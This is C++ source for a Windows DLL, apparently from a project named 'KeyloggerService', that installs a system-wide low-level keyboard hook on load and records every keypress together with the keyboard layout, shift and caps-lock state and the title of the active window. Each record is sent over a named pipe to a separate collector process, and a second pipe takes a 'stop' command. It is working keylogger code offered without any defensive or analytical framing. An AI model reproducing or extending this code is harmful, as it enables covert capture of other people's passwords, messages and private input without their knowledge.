#include <Windows.h>
#include <vector>
#include <thread>
#include <defines.h>
#include <fstream>
#include <sstream>
#include <iostream>
#include <AccCtrl.h>
#include <AclAPI.h>

HANDLE hEvent;
HANDLE hThread;
HANDLE hookThread;
HHOOK g_hHook;
HANDLE writePipe;
HANDLE hPipe;
HMODULE gModule;

std::atomic<bool> stopFlag(false);
std::atomic<bool> stopCallback(false);

void printToLog(std::string data, std::string filename = "!HookDll.log") {
    std::ofstream outFile("C:\\Users\\benosa\\source\\repos\\KeyloggerService\\x64\\Debug\\" + filename, std::ios_base::app);
    if (outFile.is_open()) {
        outFile << data << std::endl;
    }
    outFile.close();
}
void Stop()
{
    stopFlag = true;
    CancelIo(hPipe);
    if (g_hHook)UnhookWindowsHookEx(g_hHook);
    SetEvent(hEvent);
    FreeLibrary(gModule);
}

DWORD WINAPI readCommandThread(LPVOID lpThreadParameter)
{
    std::wstring name = L"\\\\.\\pipe\\myreadpipe";
    SECURITY_ATTRIBUTES sa;
    DWORD dwRead = 1;
    DWORD error;
    COMMTIMEOUTS timeouts;
    TCHAR szBuffer[BUFSIZ + 1];
    bool startFlag = false;

    HANDLE evt = (HANDLE)lpThreadParameter;
    DWORD dwModeNoWait = PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_NOWAIT;
    DWORD dwModeWait = PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT;

    DWORD ret = EXIT_FAILURE;


    InitSecurityAttributes(&sa);

    hPipe = CreateNamedPipe(name.c_str(), PIPE_ACCESS_DUPLEX, dwModeWait,
        PIPE_UNLIMITED_INSTANCES, PAGE_SIZE, PAGE_SIZE, INFINITE, &sa);
    if (hPipe == INVALID_HANDLE_VALUE)
    {
        printToLog("[*] Failed to create named pipe(" + std::to_string(GetLastError()) + ")");
        goto _exit;
    }


    ZeroMemory(&timeouts, sizeof(COMMTIMEOUTS));
    timeouts.ReadTotalTimeoutConstant = 1000;
    SetCommTimeouts(hPipe, &timeouts);

    while (WaitForSingleObject(evt, 0) != WAIT_OBJECT_0 && dwRead != 0)
    {
        ConnectNamedPipe(hPipe, NULL);
        int i = GetLastError();
        if (i == ERROR_PIPE_CONNECTED)
        {
            printToLog("[*] Client connected");
            SetNamedPipeHandleState(hPipe, &dwModeWait, NULL, NULL);

            dwRead = 1;
            error = ERROR_SUCCESS;
            while (error != ERROR_BROKEN_PIPE && !stopFlag)
            {
                startFlag = true;
                dwRead = 0;

                char data[50];
                ReadFile(hPipe, &data, sizeof(data), &dwRead, NULL);

                if (std::string(data).find("stop") != std::string::npos) {
                    goto _exit;
                }
                if (dwRead == 0)break;
                error = GetLastError();
            }
            printToLog("[*] Client disconnected");

            SetNamedPipeHandleState(hPipe, &dwModeNoWait, NULL, NULL);
            DisconnectNamedPipe(hPipe);
        }
        Sleep(100);
    }
    printToLog("[*] Server stopped");

    CloseHandle(hPipe);
    ret = EXIT_SUCCESS;
_exit:
    stopCallback = true;
    Stop();
    return ret;
}

void sendData(int keyLayout, int nCode, WPARAM wParam, LPARAM lParam) {
    //if (!writePipe)return;

    HWND window = GetForegroundWindow();
    const int MAX_TITLE_LENGTH = 1024;
    wchar_t title[MAX_TITLE_LENGTH];
    int length = GetWindowTextW(window, title, MAX_TITLE_LENGTH);

    /* std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
     std::string str = converter.to_bytes(title);*/

    int length2 = WideCharToMultiByte(CP_UTF8, 0, title, -1, NULL, 0, NULL, NULL);
    std::string str(length2, 0);
    WideCharToMultiByte(CP_UTF8, 0, title, -1, &str[0], length2, NULL, NULL);

    KBDLLHOOKSTRUCT* pKeyStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
    std::wstring result;

    bool shift = GetKeyState(VK_SHIFT) & 0x8000;
    bool capital = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

    KeyInfo info;
    info.lang = keyLayout;
    info.shift = shift;
    info.capital = capital;
    info.vkCode = pKeyStruct->vkCode;
    strcpy_s(info.title, str.c_str());
    info.window = window;

    std::size_t dataSize = sizeof(info);

    DWORD bytesWritten = 0;
    WriteFile(writePipe, &info, sizeof(info), &bytesWritten, NULL);
    if (bytesWritten != sizeof(info))
    {
        printToLog("Failed write structure size to named pipe: " + std::to_string(GetLastError()), "!SendData.log");
    }
    //CloseHandle(writePipe);
}

LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    printToLog("Triggered", "!Hookroc.log");
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
    {
        HWND window = GetForegroundWindow();
        HKL keyboardLayout = GetKeyboardLayout(GetWindowThreadProcessId(window, NULL));
        int keyLayout = static_cast<int>(reinterpret_cast<uintptr_t>(keyboardLayout));
        printToLog("KeyCode: " + nCode, "!Hookroc.log");
        sendData(keyLayout, nCode, wParam, lParam);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

DWORD WINAPI createHookProcess(LPVOID lpParam)
{
    g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, HookProc, NULL, 0);
    MSG message;

    if (g_hHook != NULL)
    {
        while (GetMessage(&message, NULL, 0, 0))
        {
            TranslateMessage(&message);
            DispatchMessage(&message);
        }
        return TRUE;
    }
    return FALSE;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        // Создаем событие
        hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
        gModule = hModule;
        if (!writePipe) {
            writePipe = CreateFile(
                L"\\\\.\\pipe\\mywritepipe",
                GENERIC_WRITE,
                0,
                NULL,
                OPEN_EXISTING,
                0,
                NULL);

            if (writePipe == INVALID_HANDLE_VALUE) {
                printToLog("Failed to open named pipe: " + GetLastError(), "!DllMain.log");
            }
        }

        hookThread = CreateThread(NULL, 0, createHookProcess, NULL, 0, NULL);;
        if (hookThread != NULL) {
            hThread = CreateThread(NULL, 0, readCommandThread, hEvent, 0, NULL);;
            if (hThread == NULL)
            {
                UnhookWindowsHookEx(g_hHook);
                return FALSE;
            }
        }
        else
        {
            if (g_hHook)UnhookWindowsHookEx(g_hHook);
            if (hEvent != NULL)CloseHandle(hEvent);
            if (hThread != NULL)CloseHandle(hThread);
            if (writePipe != NULL && writePipe != INVALID_HANDLE_VALUE) {
                CloseHandle(writePipe);
            }
            return FALSE;
        }
        break;
    case DLL_PROCESS_DETACH:
        // Сигнализируем потоку, что нужно завершить работу
        SetEvent(hEvent);

        // Ждем завершения потока
        WaitForSingleObject(hThread, INFINITE);

        // Закрываем дескриптор события и потока
        if (hEvent != NULL)CloseHandle(hEvent);
        if (hThread != NULL)CloseHandle(hThread);
        if (writePipe != NULL && writePipe != INVALID_HANDLE_VALUE) {
            CloseHandle(writePipe);
        }
        if (g_hHook)UnhookWindowsHookEx(g_hHook);
        FreeLibrary(hModule);
        break;
    }
    return TRUE;
}
